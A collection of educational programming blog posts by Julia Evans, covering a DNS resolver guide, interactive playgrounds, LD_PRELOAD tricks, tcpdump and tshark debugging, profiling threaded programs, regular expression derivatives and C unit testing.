{"url": "https://jvns.ca/blog/2023/05/12/introducing-implement-dns-in-a-weekend/", "title": "Introducing \"Implement DNS in a Weekend\"", "content": "\n     \n\n Hello! I’m excited to announce a project I’ve been working on for a long time:\na free guide to implementing your own DNS resolver in a weekend. \n\n The whole thing is about 200 lines of Python, including implementing all of the\nbinary DNS parsing from scratch. Here’s the link: \n\n \n>>  Implement DNS in a Weekend  <<\n \n\n This project is a fun way to learn: \n\n \n How to parse a binary network protocol like DNS \n How DNS works behind the scenes (what’s actually happening when you make a DNS query?) \n \n\n The testers have reported that it takes around 2-4 hours to do in Python. \n\n what’s a DNS resolver? \n\n A DNS resolver is a program that knows how to figure out what the IP address\nfor a domain is. Here’s what the command line interface of the resolver you’ll\nwrite looks like: \n\n $ python3 resolve.py example.com\n93.184.216.34\n \n\n implementing DNS gives me an amazing sense of confidence \n\n In  Learning DNS in 10 years , I\ntalked about how having implemented a toy version of DNS myself from scratch gives\nme an unparalleled sense of confidence in my understanding of DNS. \n\n So this guide is my attempt to share that sense of confidence with you all. \n\n Also, if you’ve bought  How DNS Works , I think\nthis guide is a nice companion – you can implement your own DNS\nresolver to solidify your understanding of the concepts in the zine. \n\n it’s a Jupyter notebook \n\n In this guide, I wanted to mix code that you could run with explanations. I\nstruggled to figure out the right format for months, and then I finally thought\nof using a  Jupyter notebook ! This meant that I could easily check that all of\nthe code actually ran. \n\n I used  Jupyter Book  to convert the Jupyter notebooks\ninto a website. It reruns the notebook before converting it to HTML, so I could\neasily guarantee that all of the code actually runs and outputs what it says\nthat it outputs. I ended up hacking the theme a lot to make it more minimal, as\nwell as doing some terrible things with Beautiful Soup to get a table of\ncontents that shows you the global TOC as well as the page’s local section\nheadings all in one place. \n\n You can also download the Jupyter notebooks and run them on your own computer\nif you’d like, using the “download the code” button on the  homepage . \n\n why Python? \n\n I used Python for this guide instead of a lower-level language like Go or Rust\nto make it more approachable – when I started learning networking 10 years\nago, I didn’t really know any systems languages well, and I found them kind of\nintimidating. Implementing  traceroute using scapy in Python   felt\nmuch less scary. \n\n You can very easily pack/unpack binary data in Python with  struct.pack  and\n struct.unpack , so Python being a higher-level language doesn’t really cause\nany problems. \n\n The idea is that you can either follow the guide in Python (which is the\neasiest mode), or if you want a bigger challenge, you can translate the code to\nany language you’d like. (Go? Javascript? Rust? Bash? Lua? Ruby?) \n\n only the standard library \n\n It was important to me to really show how to implement DNS “from scratch”, so\nthe guide only uses a few very basic standard library modules:  struct ,\n socket ,  io ,  random , and  dataclasses . \n\n Here’s what we use each module for: \n\n \n random  is used for generating DNS query IDs \n socket  is used to make a UDP connection \n struct  is used for converting to/from binary ( struct.pack  and  struct.unpack ) \n dataclasses  are used to make serializing / deserializing records a little more ergonomic \n io  is used for  BytesIO , which gives us a reader interface which stores a\npointer to how much of the packet we’ve read so far. If I were implementing\nDNS in a language that didn’t have this kind of reader interface, I might\nimplement my own. \n \n\n it includes some bonus exercises \n\n The toy DNS resolver is obviously missing a bunch of important features, so\nI’ve added some exercises at the end with examples of features you could add\n(and bugs you could fix) to make it a little more like a “real” DNS resolver. \n\n This list isn’t particularly exhaustive though, and I’d love to hear other\nideas for relatively-easy-to-implement DNS resolver features I’ve missed. \n\n next goal: TLS \n\n I’ve actually written toy implementations of a bunch of other network protocols\nin Python (ICMP, UDP, TCP, HTTP, and TLS), and I’m hoping to release “Implement\nTLS in a weekend” at some point. \n\n No promises though – I have another zine to finish writing first (on all the\nsurprising things about how integers and floats work on computers), and a toy\nTLS implementation is quite a bit more involved than a toy DNS implementation. \n\n thanks to the beta testers \n\n Thanks to everyone (Atticus, Miccah, Enric, Ben, Ben, Maryanne, Adam, Jordan,\nand anyone else I missed) who tested this guide and reported confusing or\nmissing explanations, mistakes, and typos. \n\n Also a huge thanks to my friend Allison Kaptur who designed the first “Domain\nName Saturday” workshop with me at the Recurse Center in 2020. \n\n The name was inspired by  Ray Tracing in One Weekend . \n\n here’s the link again \n\n Here’s the link to the guide again if you’d like to try it out: \n\n \n>>  Implement DNS in a Weekend  <<\n \n\n"},
{"url": "https://jvns.ca/blog/2023/07/08/open-sourcing-the-nginx-playground/", "title": "Open sourcing the nginx playground", "content": "\n     \n\n Hello! In 2021 I released a small playground for testing nginx configurations\ncalled  nginx playground . There’s a\n blog post about it here . \n\n This is an extremely short post to say that at the time I didn’t make it open source,\nbut I am making it open source now. It’s not a lot of code but maybe it’ll be\ninteresting to someone, and maybe someone will even build on it to make more\nplaygrounds! I’d love to see an HAProxy playground or something in a similar vein. \n\n Here’s  the github repo . The\nfrontend is in  static/  and the backend is in  api/ . The README is mostly an\nextended apology for the developer experience and note that the project is\nunmaintained. But I did test that the build instructions work! \n\n why didn’t I open source this before? \n\n I’m not very good at open source. Some of the problems I have with open sourcing things are: \n\n \n I dislike (and am very bad at) maintaining open source projects – I usually\nignore basically all feature requests and most bug reports and then feel bad about it.\nI handed off maintainership to both of the open source projects that I\nstarted ( rbspy  and  rust-bcc ) to other people who are doing a MUCH better job than I ever did. \n Sometimes the developer experience for the project is pretty bad \n Sometimes there’s configuration in the project (like the  fly.toml  or the\nanalytics I have set up) which don’t really make sense for other people to\ncopy \n \n\n new approach: don’t pretend I’m going to improve it \n\n In the past I’ve had some kind of belief that I’m going to improve the problems\nwith my code later. But I haven’t touched this project in more than a year and\nI think it’s unlikely I’m going to go back to it unless it breaks in some dramatic way. \n\n So instead of pretending I’m going to improve things, I decided to just: \n\n \n tell people in the README that the project is unmaintained \n write down all the security caveats I know about \n test the build instructions I wrote to make sure that they work (on a fresh machine, even!) \n explain (but do not fix!!) some of the messy parts of the project \n \n\n that’s all! \n\n Maybe I will open source more of my tiny projects in the future, we’ll see!\nThanks to  Sumana Harihareswara  for helping me\nthink through this. \n\n"},
{"url": "https://jvns.ca/blog/2023/04/19/new-playground-integer-exposed/", "title": "New playground: integer.exposed", "content": "\n     \n\n Hello! For the last few months we’ve been working on a zine about how integers\nand floating point numbers work. Whenever I make a zine I like to release a\nplayground to go with it, like  mess with dns  for the DNS zine or the  sql playground . \n\n For this one, I made a simple playground called  integer.exposed , inspired by\nBartosz Ciechanowski’s  float.exposed . \n\n It’s a lot less elaborate than Mess With DNS, so I’ll keep this blog post short. \n\n the inspiration: float.exposed \n\n I did a couple of talks about how integers and floating point work last month,\nand in the talk about floating point I found myself CONSTANTLY referring to\nthis site called  Float Exposed  by Bartosz Ciechanowski to demonstrate various things. (Aside: If you haven’t seen\nCiechanowski’s incredible  interactive explainers  on bicycles, mechanical watches,\nlenses, the internal combustion engine, and more, you should check them out!) \n\n Here’s what it it looks like: \n\n \n\n Things I’ve done with it: \n\n \n Increment the significand of a float (to show people how close together successive floats are) \n Show special values like  NaN  and  infinity , and show how if you change the bits in NaN, it’s still NaN \n Go to a  large integer value  and show how the distance between floats is very large \n Show how you get drastically different precision for  one million as a 32-bit float  and as a  64-bit float  (try incrementing the significand for each one!) \n \n\n and lots more! It’s an incredible way to get hands on with floats and improve your intuition around how they work. \n\n float.exposed, but for integers \n\n Integers aren’t as complicated as floats, but there are some nonobvious things\nabout them: you have signed integers and unsigned integers, you have\nendianness, and there are some weird operations like right/left shift. So when\nI was talking about integers, I found myself wanting a similar website to\n float.exposed  to demonstrate things. \n\n So with permission, I put one together at  integer.exposed . Here’s a screenshot: \n\n \n\n The UI is a little different: integers don’t have many different parts the way\nfloating point numbers do, so there’s a single row of buttons that you can use\nto do various operations on the integer. \n\n A note on byte order: Like float.exposed, it uses a big endian byte order,\nbecause I think it’s more intuitive to read. But you do have to keep in mind\nthat on most computers the bytes will actually be in the reverse order. \n\n some interesting things to try \n\n Here are some things I think are fun to try: \n\n \n signed integers : Look at how  -1  is\nrepresented. Increment and decrement it a few times and see how the signed\nand unsigned values change. Do the same with\n -128 . Also look at how -1 is represented as\na 16/32/64-bit integer. \n signed/unsigned right shift : Similarly with  -1 : try out signed right shift (also known as “arithmetic right shift”) and see how the result is different from unsigned right shift (aka “logical right shift”). \n counting in binary : Start at  0  and increment a bunch of times and watch the binary value count up. \n not : Take any number (like  123 ) and NOT it. See how  NOT  is almost exactly the same as negation, but not quite. \n swap the byte order . Take a number like  12345678  and see how if you swap the byte order, the result is an unrecognizably different number. \n look at how  powers of 2 are represented \n \n\n the tech stack \n\n As usual for me it uses Vue.js. If you want to see how it works you can just\nview source – it’s only two files,  index.html  and  script.js . \n\n I took a bunch of the CSS from  float.exposed . \n\n that’s all! \n\n Let me know if you notice any bugs! I might add more features, but I want to keep it pretty simple. \n\n I’ve also built another more involved playground that I’m hoping to release and\nwrite up soon. \n\n"},
{"url": "https://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/", "title": "LD_PRELOAD is super fun. And easy!", "content": "\n      On Monday I went to Hacker School, and as always it was the most fun\ntime. I hung out with  Chase  and we had\nfun with dynamic linkers! \n\n I’d been hearing for a while that you can override arbitrary function\ncalls in a program using an environment variable called  LD_PRELOAD .\nBut I didn’t realize how easy it was! Chase and I started using it and\nwe got it working in, like, 5 minutes! \n\n I googled “LD_PRELOAD hacks”, clicked on  Dynamic linker tricks: Using LD_PRELOAD to cheat, inject features and investigate programs ,\nand we were up and running. \n\n The first example on that page has you write a new random function that\nalways returns 42. \n\n int rand(){\n    return 42; //the most random number in the universe\n}\n \n\n That is LITERALLY ALL THE CODE YOU HAVE TO WRITE. Then you \n\n gcc -shared -fPIC unrandom.c -o unrandom.so\nexport LD_PRELOAD=unrandom.so\n \n\n and now every program you run will always return 42 for rand()! \n\n \n\n We did a bunch of investigations into how tmux works, which was super\nfun.  Chase wrote it up on his blog ,\nand now I understand about daemonization way better. \n\n We very quickly ran into the question of “okay, what if you want to call\nthe original  printf ?” from your hacked printf? That’s also explained\nin the “Dynamic linker tricks” article! (in the “Being transparent”\nsection, using  dlsym ) \n\n Somebody explained to me at some point that if you work for the NSA and\nyou’re trying to spy on what information a program is using internally,\ntools like LD_PRELOAD are VERY USEFUL. \n\n How it works \n\n There is a very wonderful\n 20 part series about linkers  that I\nam going to keep recommending to everyone forever. \n\n When you start a dynamically linked program, it doesn’t have all the\ncode for the functions it needs! So what happens is: \n\n \n the program gets loaded into memory \n the dynamic linker figures out which other libraries that program\nneeds to run ( .so  files) \n it loads them into memory, too! \n it connects everything up \n \n\n LD_PRELOAD  is an environment variable that says “Whenever you look for\na function name, look in me first!“. So if you didn’t want your program\nto be attacked like this, you could: \n\n \n statically link your program \n check for the  LD_PRELOAD  environment variable, and complain (though\nthe attacker could also LD_PRELOAD the function that lets you read\nenvironment variables… :) ) \n \n\n I’m sure there will be more Exciting Stories about LD_PRELOAD for you\nall in the future, but this is all the stories I have for today. \n"},
{"url": "https://jvns.ca/blog/2015/10/31/papers-are-amazing-profiling-threaded-programs-with-coz/", "title": "PAPERS ARE AMAZING: Profiling threaded programs with Coz", "content": "\n     \n\n HI BLOG FRIENDS! \n\n I usually don’t read papers. I only read  one paper  so far this year (which I love). I only read it because my friend Maggie printed it out and gave it to me. \n\n SO. Yesterday I got handed 3 (three!) printed out papers from the amazing organizers of  Papers We Love Montreal . And I woke up this morning and started reading one (because, Saturday morning). And then I had to tell you all about it because this paper is so cool. Okay, enough backstory. \n\n The paper we’re going to talk about is  COZ: Finding Code that Counts with Causal Profiling  (pdf). I found it super easy to read. Here is what I got out of it so far! \n\n Profiling threaded applications is hard \n\n Profiling single-threaded applications where everything happens synchronously is pretty straightforward. If one part of the program is slow, it’ll show up as taking 10% of the time or something, and then you can target that part of the program for optimization. \n\n But, when you start to use threads, everything gets way more complicated. The paper uses this program as an example: \n\n void a() { // ˜6.7 seconds\n  for(volatile size_t x=0; x<2000000000; x++) {}\n}\nvoid b() { // ˜6.4 seconds\n  for(volatile size_t y=0; y<1900000000; y++) {}\n}\nint main() {\n  // Spawn both threads and wait for them.\n  thread a_thread(a), b_thread(b);\n  a_thread.join(); b_thread.join();\n}\n \n\n Speeding up one of  a()  or  b()  won’t help you, because they  both  need to finish in order for the program to finish. (this is totally different from if we ran  a(); b() , in which case speeding up  a()  could give you an up to 50% increase in speed). \n\n Okay, so profiling threaded programs is hard. What next? \n\n Speed up one thread to see if that thread is the problem \n\n The core idea in this paper is – if you have a line of code in a thread, and you want to know if it’s making your program slow, speed up that line of code to see if it makes the  whole program  faster! \n\n Of course, you can’t actually speed up a thread. But you  can  slow down all other threads! So that’s what they do. The implemention here is super super super interesting – they use the  perf  Linux system to do this, and in particular they can do it  without modifying the program’s code . So this is a) wizardry, and b) uses  perf \n\n Which are both things we love here ( omg perf ). I’m going to refer you to the paper for now to learn more about how they use perf to slow down threads, because I honestly don’t totally understand it myself yet. There are some difficult details like “if the thread is already waiting on another thread, should we slow it down even more?” that they get into. \n\n omg it works \n\n The thing that really impressed me about this paper is that they showed the results of running this profiler on real programs (SQLite! Memcached!), and then they could use the profiler results to detect \n\n \n a problem with too many hash table collisions \n unnecessary / inefficient uses of locking (“this is atomic anyway! no need to lock!”) \n where it would be more efficient to move code from one thread to another \n \n\n and speed up the program on the workload they were testing by, like, 10%! \n\n They also find out places where speeding up a line of code would introduce a  slowdown  (because of increased contention around some resource). This paradoxically also helps them make code faster, because that’s a good site for figuring out why there’s a problem with contention and changing the ways the locks are set up. \n\n Also, they claim that the overhead of this profiling is like 20%? How can this be. This seems like literally magic except that THEY EXPLAIN HOW IT WORKS. Papers. Wow. \n\n Actually running the code \n\n You can actually download the code  on GitHub . I tried to compile it and it did not work the first time. I suspect this is because  perf  changes a little between different Linux versions (I get a bunch of errors about  perf.h ). It seems like this is something  they’re working on . Maybe a future project will be to try to get it to compile and run it on a REAL PROGRAM and see if I can reproduce some of the things they talk about in the paper! We’ll see. \n\n Async programming?! \n\n Now I’m really curious about if we could do something similar for profiling single-threaded but asynchronous applications (for all the javascript programmers in the world!). Like, if you identified a function call you were interested in speeding up, you could slow down everything else running in the event loop and see if it slowed down the overall program. Maybe someone has already tried this! If so I want to know about it. (I’m  @b0rk  on twitter). \n\n Okay, papers are cool. If you know me and want to print a paper you love and give it to me I’d be into it. \n\n"},
{"url": "https://jvns.ca/blog/2016/03/16/tcpdump-is-amazing/", "title": "tcpdump is amazing", "content": "\n     \n\n It took me 2 years, but I think now I love tcpdump. Before we go into why – what’s tcpdump? \n\n tcpdump is a tool that will tell you about network traffic on your machine. I was scared of it for a long time and refused to learn how to use it. Now I am wiser and I am here to show you that tcpdump is awesome and there is no need to be scared of it. Let’s go! \n\n tcpdump: the basics (or: how not to use it) \n\n If I just run  sudo tcpdump -i wlan0  (listen to wireless network traffic plz!), tcpdump says this: \n\n 23:48:26.679315 IP 206.126.112.170.https > kiwi.lan.47121: Flags [P.],\n seq 1:42, ack 2294, win 1672, options [nop,nop,TS val 675931991\n  ecr 60685517], length 41\n \n\n The first time I ran tcpdump I took one look at some output like that, went WELP NOPE NOPE NOPE NOPE NOPE NOPE and gave up on tcpdump. what is an ecr? a win? flags? oh god. \n\n I don’t know what hardly any of this means (though, I wrote a  tiny TCP stack  one time so I sorta know. But not enough to help too much.) \n\n So, we’ve learned that we need to pass some… options… to tcpdump to actually make use of it without being a TCP wizard. But what options? We’ll find out! First, let’s get concrete about the problems we’re trying to solve. \n\n the case of the slow HTTP request \n\n Let’s suppose you have some slow HTTP requests happening on your machine, and you want to get a distribution of how slow they are. You  could  add some monitoring somewhere inside your program. Or! You could use tcpdump. Here’s how that works! \n\n \n Use tcpdump to record network traffic on the machine for 10 minutes \n analyze the recording with Wireshark \n be a wizard \n \n\n The secret here is that we can use tcpdump to  record  network traffic, and then use a tool that we’re less scared of (Wireshark) to analyze it on our laptop after. \n\n Let’s do it! Let’s say I want to record all TCP traffic to port 80 (so, HTTP). Then I can record traffic with \n\n $ sudo tcpdump -i wlan0  \\\n               src port 80 or dst port 80 \\\n               -w port-80-recording.pcap\n \n\n This filters for only packets to or from port 80 (the name for this syntax is “pcap filters” and they are THE BEST) and saves a recording to  port-80-recording.pcap . \n\n Next up, Wireshark! I’m going to start it with  wireshark port-80-recording.pcap \n\n Here’s what we see to start: \n\n \n\n That’s a little intimidating. Every time I make a HTTP request that might be 200 TCP packets, which are a huge pain to recognize and make sense of by hand. But we can fix it! I clicked on Statistics -> Conversations, where it organizes all these disparate packets into TCP sessions. Let’s see what that looks like! \n\n \n\n This is already a lot more understandable, to me! There were 12 or so HTTP requests that happened. There’s a ‘Duration’ column that tells me the total duration of the TCP session. So some of my requests took 47ms, and some of them took 655ms. The 47ms ones are Google, and the 655ms one is ask.metafilter.com. What’s up, Metafilter? Who knows. Metafilter was sending me way more packets (google was just like “lol redirect”, 10 packets, done), so I get that it takes more time. No big deal. That was super easy! \n\n I did this at work recently because my metrics were reporting that some HTTP requests were taking like 100ms each. I ran tcpdump, did the Wireshark thing above, and Wireshark was like “yeah those are all taking 3ms. Your metrics are wrong, or at least counting something other than just the network request!”. This was a very helpful fact to know. \n\n With tcpdump I feel really confident that it’s telling me the truth about what my network traffic is up to, because that’s literally its whole job. And I can just capture packets and use it with  Wireshark  which is a really friendly and delightful tool. \n\n pcap files \n\n I mentioned really briefly that tcpdump lets you save pcap files. This is awesome because literally every network analysis tool in the universe understands pcap files. pcap files are like freshly baked chocolate chip cookies. Everybody loves them. \n\n Filtering packets \n\n Okay, so now let’s imagine we’re on a box where a lot is going on. We want to capture some TCP traffic to analyze it later. But not all the traffic! Only some of it. I mentioned before that you use “pcap filter rules” to do this. I only know how to do literally 2 things – filtering on port and IP address. Here’s the 3 second Julia tutorial on pcap filter rules. \n\n stuff being sent to port 80:\n    dst port 80\nyou can use booleans!\n    src port 80 or dst port 80\nhere's how to filter on IP:\n    ip src 66.66.66.66\n \n\n I don’t know why it’s  src port $ip  but  ip src $ip . If I get it wrong I just\ntry to switch the order. You can go read  the pcap-filter man page  and do much more\ncomplicated filtering but this has been good enough for me so far. \n\n Overhead (is it safe to run tcpdump on my production machine?) \n\n short answer: I think so, mostly. \n\n Longer answer: I don’t quite know. But here’s what I do know. \n\n I watched this  great talk by Dick Sites, who works at Google  (which you should totally watch if you’re into awesome performance stories) where he mentioned that any time he introduces a performance monitoring tool that takes up more than 1% of resources in overhead, he needs to have a long serious conversation with the datacenter administrators. He said that tcpdump is an example of something that’s too expensive. \n\n But I don’t think his requirements are my requirements (if a thing I administer gets 5% slower for 10 minutes while I collect network packets, it’s no big deal). \n\n tcpdump uses this pcap filter language, and  thomas ptacek  mentioned to me on Twitter the other day that those filter rules are compiled down to something super efficient (with an optimizing compiler?). \n\n My impression is your filter rules are collecting 500KB/s or something of network traffic, it’s probably no big deal and you can go nuts with tcpdump on your production machines. If you’re Netflix and you’re trying to save 200MB/s of packets to disk, probably you will have a bad time? I don’t know. I’ve never observed any bad effects from using tcpdump, but I do look  dstat  to get a sense for how much network traffic I might be capturing first, and try to filter appropriately. \n\n use  -n  to print the IP addresses \n\n By default, tcpdump will try to do a reverse DNS lookup on every IP address to\nturn it into a hostname. I usually want to see the IP addresses more than I\nwant to see the hostname, so I like to turn that off with  -n . \n\n The output with  -n  looks like this: \n\n $ sudo tcpdump -ni any example.com\n09:36:10.837004 IP 192.168.1.173.49363 > 192.168.1.1.53: 287+ [1au] A? example.com. (52)\n09:36:10.850843 IP 192.168.1.1.53 > 192.168.1.173.49363: 287 1/0/1 A 93.184.216.34 (56)\n \n\n The  any  is telling tcpdump to capture packets on any network interface. \n\n even more awesomeness: tshark can look inside your packets \n\n So, now we know how to filter by IP and stuff, and use wireshark. Next, I want to tell you about  tshark , which is a command line tool that comes with Wireshark. \n\n tcpdump doesn’t know about HTTP or other network protocols. It knows pretty much everything about TCP but it doesn’t care what you put  inside  your TCP packets. tshark knows all about what’s inside your TCP packets, though! \n\n Let’s say I wanted to spy on all GET requests happening on my machine. That’s super easy with tshark: \n\n $ sudo tshark -i any \\\n            -Y 'http.request.method == \"GET\"' \\\n            -T fields \\\n            -e http.request.method -e http.request.uri -e ip.dst\nGET   /hello.html     54.186.13.33\nGET   /awesome.html   172.217.3.131\nGET   /               172.217.3.131\n\n \n\n This filters for just packets which have a HTTP GET request in them, and then prints out the request method and the URI that we’re requesting for each one. It’s beautiful! I had no idea this was even possible before. But it gets better! HTTP is pretty easy. Everyone knows HTTP. But tshark doesn’t just know HTTP; it knows like EVERYTHING. Everything that Wireshark knows. \n\n Yesterday at work, I wanted to know which Mongo collections were being queried from a specific machine. This was totally impossible with the tools I had. But nothing is impossible with tcpdump/tshark! It’s just network traffic, after all. So I ran something like this: \n\n sudo tshark -i any \\\n            -f src port $mongo_port or dst port $mongo_port \\\n            -T fields \\\n            -e ip.dst -e mongo.full_collection_name\n \n\n and since tshark totally understands the Mongo protocol, it immediately started printing out Mongo collection names, and I could see exactly what was going on. It was amazing. I’m super excited to use tshark more now. \n\n go forth and tcpdump \n\n If you have questions about network traffic on your machines, maybe tcpdump is the tool for you! If you have cool tcpdump stories or other ways to use it that I haven’t mentioned here,  tell me on Twitter! . \n\n Also if you understand how to reason about the overhead of using tcpdump (“below 2 MB/s is always ok”?), I would REALLY REALLY LOVE TO KNOW. Please tell me. \n\n a zine on tcpdump \n\n In 2017 I published a short free zine called  Let’s learn tcpdump!  with more tips. \n\n"},
{"url": "https://jvns.ca/blog/2016/04/24/how-regular-expressions-go-fast/", "title": "you can take the derivative of a regular expression?!", "content": "\n     \n\n And it’s actually useful?! \n\n Paul Wankadia sent me an email yesterday about regular expressions and I thought it was so interesting I decided to write up some of what I learned from it. I thought I knew how regular expressions worked on computers because I took a class on them in university (hi prakash), but it turns out that no, I did not know. \n\n The email was about a couple of regular expression libraries he works on:  RE2 , Google’s regular expression library, and  redgrep . \n\n I did not know what RE2 was, and it is the older library, so let’s start there. \n\n regular expressions: the university class \n\n I took a class on regular expressions in university. In them, I learned that you have “regular languages”, which can be matched by deterministic finite automata, or DFAs. I’m not going to explain what those are here because I do not have space but here is a DFA. It has two states, and its job is to detect strings with an even number of zeroes. \n\n \n\n So, if you’re trying to see if the string “00100” matches, you’ll go \n\n * start: S1\n* see a 0: go to S2\n* see a 0: go to S1\n* see a 1: stay on S1\n* see a 0: go to S2\n* see a 0: go to S1\n* S1 is an \"accept\" state because of the two circles around it!\nthat means that the string 0000 matches! Yay!\n \n\n In any class like this, you’ll prove that any regular expression can be represented as an NFA (nondeterministic finite automaton), which can in turn be translated into a DFA (like the picture above). if you never took this class this may be confusing and I apologize. \n\n the important thing to know is: DFAs are simple and fast and very nice. they are state machines! \n\n how do you do regular expressions on a computer? \n\n So, now suppose that we have the regular expression  (1*01*0)*  to match any string with an even number of zeroes. That is the same as the DFA (above) and you might expect that it is actually implemented by… coding up a DFA as a state machine. Right? We said that DFAs are simple and beautiful and amazing and so the regular expression implementers probably used them. \n\n Apparently this is not true! Our next stop is a series of  posts on regular expressions by Russ Cox , who originally wrote the RE2 library ( release blog post ). I think the best place to start is  Regular Expression Matching Can Be Simple And Fast (but is slow in Java, Perl, PHP, Python, Ruby, …) . This is a very good clickbait title, and lives up to its promise by also being an excellent article. \n\n I’m not going to try to explain the article (you should just read it! it is very clear.), but it basically says \n\n \n ken thompson wrote a great regular expression search algorithm in the 60s \n perl & friends use a different algorithm (backtracking) that has worse worst-case complexity (exponential) \n at google they care about worst-case complexity because they would like their regular expressions to never explode exponentially in complexity. \n \n\n The ken thompson paper where he introduced this is called  Regular expression search algorithm . I think this is more like using a DFA than like backtracking, but it does not create the DFA explicitly (because there can be an exponential blowup there for the same reasons, and you so you don’t want to do it upfront). \n\n RE2 uses an approach more like this ken thompson approach, so that no regular expression can explode and take forever. \n\n Awesome. Let’s move on. \n\n regular expression derivatives and redgrep \n\n everything up to here made sense to me. Apparently, though, there’s more! in the next step of being a regular expressions nerd, we talk about “regular expression derivatives”. This idea comes from a paper  “Derivatives of Regular Expressions”  by Janusz Brzozowski. (link where you have to pay to download the paper, but, sci-hub.io exists).  Here is the wikipedia article . \n\n But we can describe some of the ideas in words. Let’s say we have a regular expression which is supposed to match the strings (‘a’, ‘abab’, ‘aaaabb’, ‘bbc’). \n\n The derivative of those strings with respect to  'a'  is (“, ‘bab’, ‘aaabb’) – you strip off the  a  from every string. \n\n It turns out (which is not totally obvious to me, but I think if you go through all the cases it’s not too bad) that you can take the derivative of any regular expression in a pretty straightforward way – like if you have  (a+)|(b+) , the derivative with repect to  a  is  (a+) . These derivatives turn out to combine in nice ways which is I guess why they are called derivatives. \n\n When Kamal told me about taking the derivative of a string I FREAKED OUT for like 10 seconds and I was like “omg you can’t take the derivative of a string! WHERE EVEN IS THE LIMIT. OMG.” But now I have calmed down and it seems cool. \n\n This library  redgrep , I think, compiles regular expressions into LLVM bytecode by repeatedly taking the derivative of the regular expression to give you a DFA, when it then translates to LLVM. There’s  a talk about it! . There are some pretty compelling examples of how it can take a complicated regular expression and translate it in to a pretty simple DFA. \n\n The redgrep library is all C++ and is actually only a few thousands of lines of code, including tests. So I think it’s not actually that unapproachable to read the whole thing if you’re interested – the talk gives you a walk through of the code. \n\n cool! \n\n I wanted to write this up because I got this email, was like “this will take me a while to read”, and writing up my understanding has helped me understand it better! There is definitely a lot of interesting stuff to read in these  Russ Cox articles . Time to go to sleep, though! \n\n"},
{"url": "https://jvns.ca/blog/2013/09/26/hacker-school-day-4-c-unit-testing/", "title": "Hacker School Day -4: unit testing in C. checkmk!", "content": "\n      So I’ve been accepted to the fall batch at\n Hacker School , which starts on Monday. I\nmanaged to find somewhere to live in New York, so today I went to a café\nto do some coding. \n\n One of my goals for this batch is to get better at low-level programming\nand managing my own memory, so I’m planning to learn C a bit, as well as\nmaybe Go or Rust. I’ve never really gotten further than reversing a\nstring in C, so. \n\n I am also thinking of starting to write about coding on the internet, so\nhere this is.\n \n\n Today I decided to try implementing snake in C, using ncurses. This\nturned out to be easier than I thought it would be – ncurses is pretty\nnice. Here’s  what I have so far on Github . (spoiler:\nnot too much. But you can press arrow keys and it moves! There is as yet\nno food, but you can die.) \n\n The hardest part actually turned out to be unit testing. My friend\n Chris  pointed me to a unit\ntesting framework  check \nthat he maintains. HOWEVER the tutorial starts talking about autotools.\nI spent an hour or two trying to understand how to autotools and it made\nme want to kill someone. So I stopped trying to use autotools, since I\njust want my code to run on my computer today. \n\n BUT THEN I found out that check comes with  checkmk , an awk script that\nturns snippets like this: \n\n #test test_create_cell\n    struct Snake* snake = create_cell(2, 3);\n    fail_unless(snake->x == 2);\n    fail_unless(snake->y == 3);\n \n\n into tests that  check  understands. And I could just write a normal\n Makefile  and everything was great. \n\n For some reason  checkmk  is in the source distribution for check, but\nnot in the Ubuntu package. Also if you download  checkmk  from\n this page , it doesn’t work. \n\n Conclusion: snake is too easy of a thing to do, so I probably won’t take\nthis much further. Next coding day maybe I’ll start trying to write a\nshell? We will see. \n"},
{"url": "https://jvns.ca/blog/2023/05/25/new-playground--memory-spy/", "title": "New playground: memory spy", "content": "\n     \n\n Hello! Today we’re releasing a new playground called “memory spy”. It lets you run C programs\nand see how their variables are represented in memory. It’s designed to be\naccessible to folks who don’t know C – it comes with bunch of extremely simple\nexample C programs that you can poke at. Here’s the link: \n\n \n>>  Memory Spy  <<\n \n\n This is a companion to the “how integers and floats work”  zine  we’ve been\nworking on, so the goal is mostly to look at how number types (integers and\nfloats) are represented. \n\n why spy on memory? \n\n How computers actually represent variables can seem kind of abstract, so  I\nwanted to make it easy for folks to see how a real computer actually represents\nvariables in memory. \n\n why is it useful to look at C? \n\n You might be wondering – I don’t write C! Why should I care how C programs\nrepresent variables in memory? \n\n In this playground I’m mostly interested in showing people how integers and\nfloats are represented. And low-level languages generally all represent\nintegers and floats in the same way – a 32-bit unsigned int is going to be the\nsame in C, C++, Rust, Go, Swift, etc. The exact name of the type is different,\nbut the representation is the same. \n\n In higher-level languages like Python it’s a little different, but under the\nhood a  float  in Python contains a C  double , so the C representation is\nstill pretty relevant. \n\n you don’t have to know C \n\n It uses C because C is the language where it’s the most straightforward to map\nbetween “the code in your program” and “what’s in your computer’s memory”. \n\n But if you’re not comfortable with C, this playground is still for you! We put\ntogether a bunch of example programs where you can run them and look at each\nvariable’s value. \n\n None of the example programs use any fancy features of C – a lot of the code\nis extremely simple, like  char byte = 'a'; . So you should be mostly\nable to understand what’s going on even if you don’t know C at all. \n\n how does it work? \n\n Behind the scenes, there’s a server that: \n\n \n compiles the program with  clang \n runs the program with the C debugger  lldb  (using a Python lldb script) \n returns a JSON file with the values of the variable on every line, as an array of bytes \n \n\n Then the frontend formats the array of bytes so you can look at it. The display\nlogic isn’t very fancy – ultimately it’s a pretty thin wrapper around lldb. \n\n some limitations \n\n The two main limitations I can think of right now are: \n\n \n there’s no support for loops (it’ll run them, but it’ll only tell you the value of the variable the first time through the loop) \n it only supports defining one variable per line \n \n\n There are probably more, it’s a very simple project. \n\n the inspiration \n\n Python Tutor  by Philip Guo was a huge inspiration. It has a different focus – it also lets you step through programs in a\ndebugger, but it’s more focused on helping the user build a mental model for\nhow variables and control flow work. \n\n what about security? \n\n In general my approach to running arbitrary untrusted code is 20% sandboxing\nand 80% making sure that it’s an extremely low value attack target so it’s not\nworth trying to break in. \n\n Programs are terminated after 1 second of runtime, they run in a container with\nno network access, and the machine they’re running on has no sensitive data on\nit and a very small CPU. \n\n some notes on the tech stack \n\n The backend is in Go, plus a Python script to script the interactions with\nlldb. (here’s  the source for the lldb script  and  the source for the Go server right now ). I’m\nusing  bubblewrap \nto sandbox lldb. \n\n As always the frontend is using Vue. You can see the frontend source with “view\nsource” if you want. \n\n The main fancy thing that happens on the frontend is that I use  tree sitter  to figure out which lines\nof the code have variables defined on them. \n\n some design notes \n\n As usual these days, I built this project with  Marie Claire LeBlanc Flanagan . I think the\ndesign decision I’m the happiest with is how we handled navigating the program you’re running.\nInstead of using next/previous arrows to step through the code one line at a\ntime, you can just click on a line to view its variables. \n\n 